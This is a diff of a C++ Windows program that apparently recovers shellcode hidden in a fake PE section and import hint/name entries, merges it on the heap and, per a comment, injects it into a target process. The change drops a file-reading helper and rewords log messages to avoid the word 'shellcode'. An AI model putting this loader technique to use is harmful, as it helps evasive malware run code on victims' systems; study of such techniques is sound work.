@@ -65,7 +65,6 @@ PBYTE ParseTheShellcode(size_t &shellcodeSize) {
 	PIMAGE_IMPORT_BY_NAME hintNameTableEntry = NULL;
 	// Traverse the sections to find the ..radata address
 	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
-		std::cout << sectionHeaderCursor->Name << std::endl;
 		if (strncmp((LPCSTR)sectionHeaderCursor->Name,".rrdata",strlen((LPCSTR)sectionHeaderCursor->Name)) == 0) {
 			fakeSection = sectionHeaderCursor;
 			break;
@@ -114,7 +113,7 @@ PBYTE ParseTheShellcode(size_t &shellcodeSize) {
 			offsetILT = (sizeof(IMAGE_THUNK_DATA));
 		}
 	}
-	std::cout << "[+] Size of the shellcode is " << shellcodeSize << std::endl;
+	std::cout << "[+] Size of the total merge is " << shellcodeSize << std::endl;
 	PBYTE shellcodeArea = (PBYTE) HeapAlloc(GetProcessHeap(), 0, shellcodeSize);
 	PBYTE cursor = shellcodeArea;
 	// Copy the shellcode to the newly allocated area
@@ -133,45 +132,13 @@ PBYTE ParseTheShellcode(size_t &shellcodeSize) {
 			offsetILT = (sizeof(IMAGE_THUNK_DATA));
 		}
 	}
-	std::cout << "[+] Shellcode is merged !" << std::endl;
+	std::cout << "[+] Hints are merged !" << std::endl;
 	return shellcodeArea;
-}
-
-PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize) {
-	std::cout << fileName << std::endl;
-	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hFile == INVALID_HANDLE_VALUE) {
-		std::cout << "Failed to open the file\n";
-		std::cout << GetLastError() << std::endl;
-		return NULL;
-	}
-	fileSize = GetFileSize(hFile, NULL);
-	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
-		std::cout << ("Failed to get the file size\n");
-		return NULL;
-	}
-	PBYTE fileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fileSize);
-	if (!fileBuffer) {
-		std::cout << ("Failed to get the file size\n");
-		return NULL;
-	}
-	DWORD dwBytesRead = 0;
-	if (ReadFile(hFile, fileBuffer, fileSize, &dwBytesRead, NULL) == FALSE) {
-		std::cout << ("Failed to alloc a buffer!\n");
-		return NULL;
-	}
-	if (dwBytesRead != fileSize) {
-		std::cout << ("Size problem!\n");
-		return NULL;
-	}
-	CloseHandle(hFile);
-	return fileBuffer;
 }
 
 int main(int argc, char *argv[]) {
 	PBYTE mergedShellcode = NULL;
 	uint64_t shellcodeSize = 0;
-	uint64_t fileSize = 0;
 	// Parse the shellcode from hint/name table
 	mergedShellcode = ParseTheShellcode(shellcodeSize);
 	// Inject the given shellcode to the process whose PID is given or execute it
